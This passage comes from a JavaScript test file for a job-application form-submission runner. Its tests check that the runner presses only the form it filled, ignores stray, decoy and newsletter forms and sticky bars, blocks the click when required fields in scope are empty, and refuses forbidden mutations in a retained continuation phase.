    { type: 'extract', selector: '#app-form', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '#stray', attribute: 'data-litos-submit-scope-v2' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, ['application'], 'the application is pressed and the filter is not');
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(result.requiredFieldConfirmation.passes[0].scope.scopeKind, 'container');
  assert.equal(valueOf(result, '#app-form'), '1');
  assert.equal(valueOf(result, '#stray'), null, 'a keyword box and two selects are not an application');
});

test('the benign stray label is decided the same way as the two reported ones', async () => {
  // "Subscribe" is not a final control, so this page was already submitted correctly. It is here
  // to fail any fix that recognises the labels it was told about instead of the shape of the form.
  const { status, result, clicks: recorded } = await run('/stray-subscribe', [
    { type: 'extract', selector: '#app-form', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '#stray', attribute: 'data-litos-submit-scope-v2' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, ['application'], 'the application is pressed and Subscribe is not');
  assert.equal(result.requiredFieldConfirmation.passes[0].scope.scopeKind, 'container');
  assert.equal(valueOf(result, '#app-form'), '1');
  assert.equal(valueOf(result, '#stray'), null);
});

test('a page carrying only a stray form and no application clicks nothing', async () => {
  const { status, result, clicks: recorded } = await run('/stray-only');
  // Clicks first, deliberately: what this case is about is the control that gets pressed, and a
  // failure that names the exit code before the click hides which form was submitted.
  assert.deepEqual(recorded, [], 'a stranger\'s form is never pressed to satisfy a submit action');
  assert.notEqual(status, 0, 'no application means no submit, and the run stops');
  assert.equal(result, null, 'a failed pass writes no result packet');
});

test('a three field application with a bare Submit is not mistaken for a stray form', async () => {
  const { status, result, clicks: recorded } = await run('/minimal-application', [
    { type: 'extract', selector: '#application', attribute: 'data-litos-submit-scope-v2' }
  ]);
  assert.equal(status, 0, 'the smallest real application must still submit');
  assert.deepEqual(recorded, ['minimal'], 'name, email and a resume is an application');
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  const pass = result.requiredFieldConfirmation.passes[0];
  assert.equal(pass.scope.scopeKind, 'form');
  assert.equal(pass.submissionOutcome, 'clicked');
  assert.equal(valueOf(result, '#application'), '0');
});

test('a one field form this run never touched is not submitted', async () => {
  const { status, result, clicks: recorded } = await run('/one-field-form');
  assert.deepEqual(recorded, [], 'a form with no more in it than a newsletter has is not pressed');
  assert.notEqual(status, 0);
  assert.equal(result, null);
});

test('a one field form this run was sent to fill is the application', async () => {
  const { status, result, clicks: recorded } = await run('/one-field-form', [
    { type: 'extract', selector: '#signup', attribute: 'data-litos-submit-scope-v2' }
  ], [
    { type: 'fill', selector: '#one-email', value: 'mehek@example.com', label: 'Email' }
  ]);
  assert.equal(status, 0, 'the same page, submitted, because this run filled it');
  assert.deepEqual(recorded, ['one-field'], 'the form this run typed into is the one it submits');
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(result.requiredFieldConfirmation.passes[0].scope.scopeKind, 'form');
  assert.equal(valueOf(result, '#signup'), '0');
});

test('a self identification page under a sticky bar presses neither of them', async () => {
  const { status, result, clicks: recorded } = await run('/eeo-sticky-bar');
  assert.deepEqual(recorded, [], 'the sticky bar is not a consolation prize for refusing the form');
  assert.notEqual(status, 0, 'a form this run cannot confirm ends the run, it does not redirect it');
  assert.equal(result, null);
});

test('the same self identification page submits its own form once the run has answered it', async () => {
  const { status, result, clicks: recorded } = await run('/eeo-sticky-bar', [
    { type: 'extract', selector: '#real', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '#decoy', attribute: 'data-litos-submit-scope-v2' }
  ], [
    { type: 'fill', selector: '#race', value: 'Asian', label: 'Race' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, ['application'], 'the form this run answered is the one it submits');
  assert.equal(result.requiredFieldConfirmation.passes[0].scope.scopeKind, 'form');
  assert.equal(valueOf(result, '#real'), '0', 'candidate 0 is the form submit');
  assert.equal(valueOf(result, '#decoy'), null, 'the bar is never a scope while the form is viable');
});

test('a one question screening form under a sticky bar presses neither of them', async () => {
  const { status, result, clicks: recorded } = await run('/screening-sticky-bar');
  assert.deepEqual(recorded, [], 'one answered question is not enough to press anything on this page');
  assert.notEqual(status, 0);
  assert.equal(result, null);
});

test('the same screening page submits its own form once the run has filled it', async () => {
  const { status, result, clicks: recorded } = await run('/screening-sticky-bar', [], [
    { type: 'fill', selector: '#years', value: '3', label: 'Years of Python' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, ['application'], 'the filled form wins over the formless bar');
  assert.equal(result.requiredFieldConfirmation.passes[0].scope.scopeKind, 'form');
});

test('a refused form beside a decoy that clears the intake bar still presses neither', async () => {
  /* The decoy collects a name and an email, which is exactly what the refused form failed to show.
   * A threshold cannot separate them, because the decoy is over it. Only the two things a decoy
   * cannot manufacture can: this run's own record of what it wrote, and a label that names the
   * application. The decoy has neither. */
  const { status, result, clicks: recorded } = await run('/eeo-rich-decoy', [
    { type: 'extract', selector: '#decoy', attribute: 'data-litos-submit-scope-v2' }
  ]);
  assert.deepEqual(recorded, [], 'a richer decoy is still not this run\'s application');
  assert.notEqual(status, 0);
  assert.equal(result, null);
});

test('a refused form beside a decoy carrying a file input still presses neither', async () => {
  // The other half of the intake test, bought just as cheaply: one email and a CV upload.
  const { status, result, clicks: recorded } = await run('/screening-rich-decoy');
  assert.deepEqual(recorded, [], 'an upload box does not make a widget the application either');
  assert.notEqual(status, 0);
  assert.equal(result, null);
});

test('the rich decoy page submits the real form once the run has answered it', async () => {
  const { status, result, clicks: recorded } = await run('/eeo-rich-decoy', [
    { type: 'extract', selector: '#real', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '#decoy', attribute: 'data-litos-submit-scope-v2' }
  ], [
    { type: 'fill', selector: '#race', value: 'Asian', label: 'Race' }
  ]);
  assert.equal(status, 0, 'refusing the decoy must not cost the page its own submit');
  assert.deepEqual(recorded, ['application'], 'the answered form wins over the richer decoy');
  assert.equal(result.requiredFieldConfirmation.passes[0].scope.scopeKind, 'form');
  assert.equal(valueOf(result, '#real'), '0');
  assert.equal(valueOf(result, '#decoy'), null);
});

test('a real Greenhouse form beside a stray form is chosen exactly as it is today', async () => {
  const { status, result, clicks: recorded } = await run('/greenhouse-stray', [
    { type: 'extract', selector: '#application', attribute: 'data-litos-submit-scope-v2' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, ['greenhouse'], 'the application form is pressed, and only it');
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(result.requiredFieldConfirmation.passes[0].scope.scopeKind, 'form');
  assert.equal(valueOf(result, '#application'), '2', 'candidate 2 is the in-form submit');
});

test('the container scope bounds the required-field scan to its own fields', async () => {
  // The block outside the container carries a live "This requires an answer" over a field this run
  // never filled. A scope that leaked up to the page would report it and blame the wrong form.
  const { status, result, clicks: recorded } = await run('/scan-bounds');
  assert.equal(status, 0);
  assert.deepEqual(recorded, [], 'an empty required field in scope withholds the click');
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.submitOutcome.pressed, false);
  const pass = result.requiredFieldConfirmation.passes[0];
  assert.equal(pass.scope.scopeKind, 'container');
  assert.equal(pass.scope.requiredControlCount, 1);
  assert.equal(pass.attempts.length, 1);
  assert.match(pass.attempts[0].label || '', /Full name/);
  assert.equal(pass.attempts[0].outcome, 'failed');
  assert.ok(pass.unresolved.some((entry) => /Full name/.test(entry)), 'the in-scope field blocks');
  assert.doesNotMatch(JSON.stringify(pass.unresolved), /unmatched validation error/i, 'the aside is not this form');
  assert.doesNotMatch(JSON.stringify(pass.attempts), /Newsletter/i);
});

test('a retained page cannot use a second application mutation after a shadow submit', async () => {
  /* Phase zero binds a scope inside the shadow root and clicks it. A retained phase may now carry
   * only the exact verification-code mutation, so the former light-DOM application submit must be
   * rejected before it can mutate the retained page. */
  clicks.length = 0;
  fs.rmSync(resultPath(0), { force: true });
  fs.rmSync(resultPath(1), { force: true });
  const continuationInput = path.join(workDir, 'stratus-continuation-input.json');
  fs.rmSync(continuationInput, { force: true });
  fs.rmSync(path.join(workDir, 'stratus-continuation-ready.json'), { force: true });
  writeInput('/shadow', [], {
    requestContinuation: true,
    continuationCheckpoint: true,
    continuationTtlSeconds: 20,
    continuationExpiresAt: new Date(Date.now() + 20_000).toISOString()
  });
  const child = startRunner();
  const closed = new Promise((resolve) => child.on('close', resolve));
  const waitFor = async (file, timeoutMs = 60_000) => {
    const deadline = Date.now() + timeoutMs;
    while (!fs.existsSync(file) && Date.now() < deadline) await new Promise((resolve) => setTimeout(resolve, 25));
    return fs.existsSync(file);
  };
  assert.ok(await waitFor(resultPath(0)), 'phase zero must produce a result');
  const first = readResult(0);
  assert.equal(first.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(first.requiredFieldConfirmation.passes[0].scope.scopeKind, 'container');
  assert.deepEqual(clicks, ['shadow'], 'phase zero presses the control inside the shadow root');
  fs.writeFileSync(continuationInput, JSON.stringify({
    parentSubmissionAttempt: SUBMISSION_ATTEMPT,
    submissionAttempt: {
      ...SUBMISSION_ATTEMPT,
      executionId: '44444444-4444-4444-8444-444444444444'
    },
    providerDeadlineAt: providerDeadlineAt(),
    actions: [
      { type: 'click', selector: '#mutate' },
      submitAction,
      { type: 'extract', selector: '#submitted' },
      { type: 'extract', selector: '#light', attribute: 'data-litos-submit-scope-v2' }
    ],
    screenshot: false
  }));
  const errorPath = path.join(workDir, 'stratus-error.json');
  assert.ok(await waitFor(errorPath), 'the forbidden retained mutation must fail closed');
  const failure = JSON.parse(fs.readFileSync(errorPath, 'utf8'));
  assert.match(failure.message, /retained continuation attempted a forbidden mutation path/);
  assert.deepEqual(clicks, ['shadow'], 'the retained phase performs no employer action');
  assert.equal(await closed, 1);
  assert.equal(fs.existsSync(resultPath(1)), false);
});
